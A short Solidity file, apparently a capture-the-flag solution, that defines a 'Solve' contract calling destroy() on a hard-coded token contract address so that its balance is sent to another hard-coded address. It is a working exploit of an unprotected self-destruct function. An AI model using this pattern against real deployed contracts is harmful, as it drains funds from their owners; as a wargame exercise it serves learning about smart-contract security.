// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface SimpleToken {
    function destroy(address payable _to) external;
}

contract Solve {
    function solve() public payable {
        SimpleToken lostContract = SimpleToken(
            0xE27Aa47790B7393c3F200c78909C637c0d07FeEF
        );

        lostContract.destroy(
            payable(0x940BCF526Ee4F346771b9dA31aa6736eb8B822a5)
        );
    }
}
